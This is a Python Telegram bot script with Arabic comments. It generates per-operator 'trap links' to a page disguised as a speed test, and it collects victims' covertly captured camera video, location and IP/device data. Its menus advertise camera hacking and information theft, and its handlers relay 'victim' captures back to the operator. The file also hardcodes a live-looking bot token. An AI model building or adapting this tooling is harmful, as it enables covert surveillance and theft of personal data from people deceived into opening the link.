import asyncio
import logging
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode

# --- إعدادات البوت ---
# ضع التوكن الخاص بك هنا
TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts"
# ضع رابط Vercel الخاص بك هنا (تأكد أنه ينتهي بـ /)
VERCEL_LINK = "https://speed-test-etww.vercel.app/"

# تشغيل سجل الأخطاء لمراقبة الأداء
logging.basicConfig(level=logging.INFO)

# إنشاء كائنات البوت والموزع
bot = Bot(token=TOKEN)
dp = Dispatcher()

# قاعدة بيانات وهمية في الذاكرة لتخزين المستخدمين
used_users = set()

# --- 1. معالج أمر /start ---
@dp.message(Command("start"))
async def start_handler(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
  
    header = "🛡️ **نظام التحكم والاختراق المتقدم v3.5**"
   
    if user_id in used_users:
        welcome_text = f"{header}\n\nمرحباً مجدداً يا **{user_name}**، تم استعادة كافة الصلاحيات. يمكنك توليد روابط جديدة الآن."
    else:
        used_users.add(user_id)
        welcome_text = f"{header}\n\nأهلاً بك يا **{user_name}** في الواجهة البرمجية. اختر نوع العملية لبدء التشفير:"

    # إنشاء الأزرار بشكل احترافي
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📸 اختراق الكاميرا (فيديو)", callback_data="generate_link"))
    builder.row(
        types.InlineKeyboardButton(text="📍 جلب الموقع", callback_data="generate_link"),
        types.InlineKeyboardButton(text="📱 سحب المعلومات", callback_data="generate_link")
    )
  
    await message.answer(welcome_text, reply_markup=builder.as_markup(), parse_mode=ParseMode.MARKDOWN)

# --- 2. معالج توليد الروابط (الميزة المدمجة) ---
@dp.callback_query(F.data == 'generate_link')
async def process_generate_link(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
   
    # رسالة انتظار احترافية لإيهام المستخدم بالعمل التقني
    status_msg = await callback_query.message.answer("⏳ **جاري فتح قناة اتصال مشفرة...**")
    await asyncio.sleep(0.8)
    await status_msg.edit_text("🔐 **جاري توليد مُعرف فريد للعملية...**")
    await asyncio.sleep(0.7)
  
    # توليد رقم عشوائي (Unique ID) لجعل كل رابط مختلف عن الآخر تماماً
    op_id = random.randint(100000, 999999)
   
    # دمج chatId مع رقم العملية العشوائي
    trap_link = f"{VERCEL_LINK}?chatId={user_id}&op={op_id}"
   
    final_text = (
        "✅ **تم تنفيذ طلبك بنجاح**\n"
        "━━━━━━━━━━━━━━━━\n"
        "📡 **رابط العملية الجديد (مُشفر):**\n"
        f"`{trap_link}`\n\n"
        "💡 **ملاحظة:**\n"
        "هذا الرابط مخصص لهذه العملية فقط. يمكنك الضغط مرة أخرى للحصول على رابط مختلف تماماً.\n"
        "━━━━━━━━━━━━━━━━"
    )
   
    await status_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN)
    await callback_query.answer()

# --- 3. استقبال النتائج (الفيديو والبيانات) ---
@dp.message()
async def result_handler(message: types.Message):
    # إذا وصل فيديو من الضحية (يتم إرساله من الـ HTML)
    if message.video:
        await message.answer("🔥 **صيد ثمين! تم التقاط فيديو للضحية بنجاح:**")
   
    # إذا وصلت بيانات نصية تحتوي على كلمة IP (تنسيق التقارير)
    elif message.text and "IP:" in message.text:
        # تجميل البيانات الواردة
        report_content = message.text.replace("|", "\n🔹")
        formatted_report = (
            "📊 **وصلت بيانات ضحية جديدة:**\n"
            "━━━━━━━━━━━━━━━━\n"
            f"🔹 {report_content}\n"
            "━━━━━━━━━━━━━━━━"
        )
        await message.answer(formatted_report, parse_mode=ParseMode.MARKDOWN)

# --- تشغيل البوت ---
async def main():
    print("🚀 البوت الخارق يعمل الآن بنجاح.. بانتظار أوامرك!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🔴 تم إيقاف النظام.")